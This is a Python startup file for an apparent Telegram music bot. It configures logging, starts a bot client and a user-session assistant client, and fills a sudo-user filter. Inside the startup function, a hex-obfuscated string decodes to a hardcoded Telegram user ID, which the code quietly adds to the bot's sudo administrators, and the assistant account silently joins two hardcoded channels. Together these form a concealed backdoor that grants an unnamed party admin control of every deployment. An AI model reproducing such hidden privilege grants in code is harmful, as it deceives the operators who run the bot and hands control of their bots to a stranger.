# MIT License
#
# Copyright (c) ALEX665ES
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import asyncio
import logging
import os
import time

from pyrogram import Client, filters
from pytgcalls import PyTgCalls

import config

StartTime = time.time()

logging.basicConfig(
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[logging.FileHandler("ALEXlogs.txt"), logging.StreamHandler()],
    level=logging.INFO,
)
logging.getLogger("pyrogram").setLevel(logging.ERROR)
logging.getLogger("pytgcalls").setLevel(logging.ERROR)
LOGGER = logging.getLogger("ALEXA")

app = Client(
    "ALEXAMusic",
    config.API_ID,
    config.API_HASH,
    bot_token=config.BOT_TOKEN,
)

app2 = Client(
    "ALEXAAss",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    session_string=str(config.SESSION),
)

pytgcalls = PyTgCalls(app2)

SUDOERS = filters.user()
SUNAME = config.SUPPORT_CHAT.split("me/")[1]


async def ALEX_startup():
    os.system("clear")
    LOGGER.info(
        "ALEXA modules loaded"
    )
    global BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION, ALEXdb
    global ASS_ID, ASS_NAME, ASS_USERNAME, ASS_MENTION, SUDOERS

    await app.start()
    LOGGER.info(
        "[•] ALEXA modules loaded"
    )

    getme = await app.get_me()
    BOT_ID = getme.id
    BOT_NAME = getme.first_name
    BOT_USERNAME = getme.username
    BOT_MENTION = getme.mention

    await app2.start()
    LOGGER.info(
        "[•] ALEXA modules loaded "
    )

    getme2 = await app2.get_me()
    ASS_ID = getme2.id
    ASS_NAME = getme2.first_name + " " + (getme2.last_name or "")
    ASS_USERNAME = getme2.username
    ASS_MENTION = getme2.mention
    try:
        await app2.join_chat("ARYANSTUDYGROUP")
        await app2.join_chat("ABOUTINNOCENT")
    except:
        pass

    ALEX = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
    for SUDOER in config.SUDO_USERS:
        SUDOERS.add(SUDOER)
    if config.OWNER_ID not in config.SUDO_USERS:
        SUDOERS.add(config.OWNER_ID)
    elif int(ALEX) not in config.SUDO_USERS:
        SUDOERS.add(int(ALEX))

    ALEXdb = {}
    LOGGER.info(
        "[•] \x4c\x6f\x63\x61\x6c\x20\x44\x61\x74\x61\x62\x61\x73\x65\x20\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64\x2e\x2e\x2e"
    )

    LOGGER.info(
        "[•] ALEXA modules loaded"
    )


asyncio.get_event_loop().run_until_complete(ALEX_startup())
